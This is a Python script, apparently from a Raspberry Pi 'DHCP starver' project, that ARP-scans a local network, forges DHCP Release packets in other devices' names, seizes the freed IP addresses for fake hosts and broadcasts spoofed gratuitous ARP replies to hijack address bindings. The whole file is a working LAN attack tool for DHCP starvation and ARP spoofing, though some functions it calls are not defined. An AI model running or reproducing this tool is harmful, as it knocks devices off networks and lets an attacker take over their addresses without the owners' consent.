# ARP scan to find hosts connected to network and "steal" their IP addresses
#### IMPORTS #### -------------------------------------------------------------------
import scapy.all as scapy
import netifaces
import ipaddress
import time
import json
import threading
import logging
from logging.handlers import TimedRotatingFileHandler
import random
from datetime import datetime
import subprocess


#### CONFIG #### -------------------------------------------------------------------
iface = "eth0"  # Network interface to spoof
timeout_to_receive_arp_reply = 5 # Time to wait to receive ARP Reply (seconds)
delay_between_arp_scans = 120  # seconds
json_file = "/home/pi/dhcp_starver/spoofed_hosts.json"
log_file = "/home/pi/dhcp_starver/logs/dhcp_spoof.log"


#### GLOBAL VARIABLES #### ---------------------------------------------------------
# Dict of all spoofed ip addresses k:IP, v:fake_host
spoofed_ip_dict = dict()

# DHCP Server's IP and MAC address
dhcp_server_ip = ""
dhcp_server_mac = ""

# Our own device's network parameters
our_ip_address = ""
our_mac_address = ""
our_netmask = ""
our_network = ""


#### EXTRA GLOBAL STUFF #### ------------------------------------------------------
class fake_host:
    """
    Defines basic parameters of a host
    """
    def __init__(self, mac_address, transaction_id):
        self.ip_address = None
        self.mac_address = mac_address
        self.transaction_id = transaction_id
        self.hostname = "elvispresley"
        self.lease_time = None  # IP Address Lease Time offered by DHCP Server
        self.acquisition_time = None  # Time when IP Address was obtained/renewed
        self.is_spoofed = False  # Sets if this host has acquired successfully the IP Address
        self.is_server = False # True when this IP address if from DHCP server's network
    def to_dict(self):
        return {
            "ip_address" : self.ip_address,
            "mac_address" : self.mac_address,
            "transaction_id" : self.transaction_id,
            "hostname" : self.hostname,
            "lease_time" : self.lease_time,
            "acquisition_time" : self.acquisition_time.strftime("%Y-%m-%d %H:%M:%S"),
            "is_spoofed" : self.is_spoofed,
            "is_server" : self.is_server
        }
    @classmethod
    def from_dict(cls, data):
        instance = cls(mac_address=data["mac_address"], transaction_id=data["transaction_id"])
        instance.ip_address = data["ip_address"]
        instance.hostname = data["hostname"]
        instance.lease_time = data["lease_time"]
        instance.acquisition_time = datetime.strptime(data["acquisition_time"], "%Y-%m-%d %H:%M:%S")
        instance.is_spoofed = data["is_spoofed"]
        instance.is_server = data["is_server"]
        return instance

# Define a semaphore for .log/.json file access without collision
file_semaphore = threading.Semaphore()

# Set up logging with rotation policy
handler = TimedRotatingFileHandler(log_file, when="midnight", interval=1, backupCount=7, encoding='utf-8', utc=True)
handler.suffix = "%Y-%m-%d"
handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger = logging.getLogger()
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# Set up scapy logger to error
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


#### FUNCTIONS #### ----------------------------------------------------------------
def write_to_log(message):
    """
    Write message to log file
    """
    with file_semaphore:
        logger.info(message)


def get_random_mac():
    """
    Returns a string with a "random" MAC address
    """
    mac = "34:" # Our bogus MAC addresses starts with 34 to make it easier to track/debug
    for i in range(10):
        num = random.randint(0, 15)
        if num < 10:
            num = chr(48 + num)
        else:
            num = chr(87 + num)
        mac += num
        if i % 2 == 1:
            mac += ":"
    return mac[:-1]


def get_unspoofed_ips(network_ip_addresses):
    """
    Compares avalaible ip addresses with spoofed ips to return a list with non spoofed IP addresses
    """
    try:
        # Iterating for every fake_host in the dictionary
        for ip, host in spoofed_ip_dict.items():
            # Check if host is spoofed or is DHCP server
            if host.is_spoofed or host.is_server:
                # Remove IP address from all IP addresses list
                network_ip_addresses.remove(ip)
        return network_ip_addresses
    except:
        # If an error occurs, return the whole address list
        return network_ip_addresses


def release_and_catch(host_mac, host_ip):
    """
    Release device's IP address and try to assign it to a fake host
    """
    # Send DHCP Release to force a new IP address adquisition by the host
    send_release(host_mac, host_ip)
    # Wait for t seconds and try to catch that released IP address
    time.sleep(5)
    # Create a new ficticious host and adds it to the dictionary
    fake_host = create_fake_host()
    global fake_host_dict
    fake_host_dict[fake_host.mac_address] = fake_host
    # Sending discover
    send_discover(fake_host)
    # Setting xid for detecting ACK
    #global response_received_xid
    #response_received_xid = fake_host.transaction_id
    # Waits until IP acquisition is completed
    #response_received_semaphore.acquire(timeout=60)
    #response_received_barrier.wait()

    send_gratuitous_arp(fake_host.mac_address, host_ip)


def send_release(host_mac, ip_address):
    """
    Send DHCP Release
    """
    # Getting a random Trans ID
    trans_id = random.getrandbits(32)
    # Converting MAC addresses
    mac_address = int(host_mac.replace(":", ""), 16).to_bytes(6, "big")
    server_mac = int(dhcp_server_mac.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Release packet
    ether_header = scapy.Ether(src=mac_address, 
                               dst=server_mac)
    ip_header = scapy.IP(src=ip_address, 
                         dst=dhcp_server_ip)
    udp_header = scapy.UDP(sport=68, 
                           dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address,
                              ciaddr=ip_address,
                              xid=trans_id,
                              flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "release"),
                                     ("server_id", dhcp_server_ip),
                                     "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_request, verbose=False, iface=iface)
    write_to_log(f"Releasing IP address {ip_address} from {host_mac}")


def send_gratuitous_arp(host_mac, host_ip):
    """
    Send an ARP Request announcing defined IP-MAC association
    """
    ether_header = scapy.Ether(src=host_mac, 
                               dst="ff:ff:ff:ff:ff:ff")
    arp_header = scapy.ARP(op=2, # 1=Request, 2=Reply 
                           pdst=host_ip, 
                           psrc=host_ip, 
                           hwsrc=host_mac)
    arp_request = ether_header/arp_header
    # Send 3 Gratuitous ARPs trying to force an IP renewal on the connected device
    for _ in range(3):
        scapy.sendp(arp_request, verbose=False, iface=iface)
    write_to_log(f"Sending Gratuitous ARP announcing {host_mac} - {host_ip}")


def arp_scan(target_ips):
    """
    Performs a targeted ARP request scan to find existing hosts on the network.
    Returns a list with hosts' (IP, MAC) tuples who have answered
    """
    # ARP Request packet, one for every unspoofed ip address
    arp_requests = [scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip) for ip in target_ips]
    # Send it and catch ARP Reply response(s)
    result, _ = scapy.srp(arp_requests, timeout=timeout_to_receive_arp_reply, verbose=False)

    # List to save hosts' (IP, MAC) tuples who have answered
    responsive_ips = []
    # For every response, checks if it's an ARP response and saves the responding host params
    for _ , received in result:
        if received.haslayer(scapy.ARP):
            arp_layer = received[scapy.ARP]
            # Checking if it's Reply
            if arp_layer.op == 2:
                ip_address = received.psrc
                mac_address = received.hwsrc.lower()
                responsive_ips.append((ip_address, mac_address.lower()))
    # Checks if someone of this hosts is the router/DHCP server
    for (ip, mac) in responsive_ips:
        is_router = check_if_router(ip)
        if is_router:
            global dhcp_server_ip, dhcp_server_mac
            dhcp_server_ip = ip
            dhcp_server_mac = mac

    return responsive_ips
  

def get_dhcp_leases():
    """
    Reads /etc/pihole/dhcp.leases and loads it to a dictionary
    """
    dhcp_leases = {}
    with open("/etc/pihole/dhcp.leases", 'r') as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) >= 5:
                #timestamp = parts[0]
                mac_address = parts[1]
                ip_address = parts[2]
                hostname = parts[3]
                #if len(parts) > 4:
                #    hostname += " " + " ".join(parts[4:])
                #dhcp_leases[mac_address] = {'timestamp': timestamp, 'ip_address': ip_address, 'hostname': hostname}
                dhcp_leases[mac_address] = {'ip_address': ip_address, 'hostname': hostname}
    return dhcp_leases









def check_if_router(ip_address):
    """
    Check if that IP address belongs to network's router/DHCP server
    """
    try:
        # Execute the 'ip route' command
        route_output = subprocess.check_output(['/usr/sbin/ip', 'route', 'get', '8.8.8.8'], text=True)
        return ip_address in route_output
    except subprocess.CalledProcessError:
        return False
    
def load_from_json(file_path):
    """
    Load json file contents to a dictionary
    """
    # Load json contents to a dictionary
    write_to_log(f"Loading results from {file_path}")
    with file_semaphore:
        with open(file_path, 'r') as file:
            data = json.load(file)
    # Create fake_host dict with fake_host objects
    spoofed_host_dict = {}
    for ip, host_data in data.items():
        spoofed_host_dict[ip] = fake_host.from_dict(host_data)
    return spoofed_host_dict


def save_results_to_json(results, file_path):
    """
    Saves fake_host dictionary to a json file
    """
    serializable_dict = {mac: host.to_dict() for mac, host in results.items()}
    with file_semaphore:
        with open(file_path, 'w') as json_file:
            json.dump(serializable_dict, json_file, indent=4)


def get_network_params(iface_name):
    """
    Get IP address, MAC address, netmask and network address from selected interface
    """
    try:
        iface = netifaces.ifaddresses(iface_name)
        ip_address = iface[netifaces.AF_INET][0]['addr']
        mac_address = iface[netifaces.AF_LINK][0]['addr']
        network_mask = iface[netifaces.AF_INET][0]['netmask']
        # Obtaining network address
        #network_address = ipaddress.ip_network(f"{ip_address}/{network_mask}", strict=False)
        #return ip_address, mac_address, network_mask, str(network_address)
        return ip_address, mac_address, network_mask
    except (KeyError, IndexError):
        return None, None, None


def get_hosts_from_network(ip_address, netmask):
    """
    Returns a list of all possible assignable IP addresses to hosts on the interface network
    """
    network = ipaddress.IPv4Network(ip_address + "/" + netmask, strict=False)
    # List of avalaible addresses
    address_list = [str(ip_address) for ip_address in network.hosts()] 
    return address_list


def main():

    write_to_log(f"Starting ARP Request scan")
    global our_ip_address, our_netmask
    our_ip_address, _, our_netmask = get_network_params(iface)
    
    # Getting all host avalaible IP addresses for network
    network_ip_addresses = get_hosts_from_network(our_ip_address, our_netmask)

    # Load previous spoofed hosts from json file
    global spoofed_ip_dict
    try:
        write_to_log(f"Loading previous results from {json_file}")
        spoofed_ip_dict = load_from_json(json_file)
    except FileNotFoundError:
        write_to_log(f"File not found: {json_file}")
        spoofed_ip_dict = {}
    except json.JSONDecodeError as e:
        write_to_log(f"Error decoding JSON file: {e}")
        spoofed_ip_dict = {}

    # Get a list with non spoofed host's IP addresses checking spoofed_ip_dict
    target_ips = get_unspoofed_ips(network_ip_addresses)
    # Perform an ARP scan
    ip_mac_data = arp_scan(target_ips)
    # Getting Pi-hole DHCP Server's IP lease list
    spoofed_hosts = get_dhcp_leases()

    
    for ip, mac in ip_mac_data:
        # Checking if discovered host is not already spoofed
        if mac not in spoofed_hosts.keys():
            write_to_log(f"ARP Scan: Found non-spoofed host {ip} - {mac}")
            # Try to release that host IP address and kidnap it
            release_and_catch(mac, ip)
    
    

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt as e:
        write_to_log(f"Service terminated")